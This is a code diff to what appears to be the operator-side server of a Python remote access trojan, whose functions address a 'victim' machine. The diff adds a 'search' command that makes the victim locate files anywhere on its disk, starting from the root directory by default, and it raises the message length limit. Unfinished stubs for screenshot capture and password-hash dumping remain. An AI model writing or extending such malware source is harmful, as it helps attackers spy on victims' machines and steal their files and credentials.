@@ -3,7 +3,7 @@ from sys import argv
 import socket
 import rsa
 from cryptography.fernet import Fernet
-MSGLEN=2048
+MSGLEN=4294967296
 
 def help():
   print("""
@@ -23,6 +23,15 @@ COMMANDS :
 def ipconfig(victim):
   victim.send('ip')
   print(victim.receive())
+
+def search(victim, filename, path):
+  victim.send('search')
+  victim.send(' '.join([filename,path]))
+  result = (victim.receive())
+  if result == "":
+    print("File not found")
+  else:
+    print(result)
 
 class SecureServer:
   def __init__(self, host="127.0.0.1", port=62832):
@@ -57,8 +66,19 @@ class SecureServer:
           print('command still in dev :/')
           #screenshot()
         case 'search':
-          print('command still in dev :/')
-          #search(cmd.split(" ")[1:])
+          check = cmd.split(" ")
+          if len(check) ==2 and not "" in check:
+            name = check[1]
+            path = '/'
+            search(self,name,path)
+          elif len(check) ==3 and not "" in check :
+            path = check[1]
+            name = check[2]
+            search(self,name,path)
+          else:
+            print("search file [path] Find the location of a file in a directory, defaults to root directory.")
+
+
         case 'hashdump':
           print('command still in dev :/')
           #hashdump()
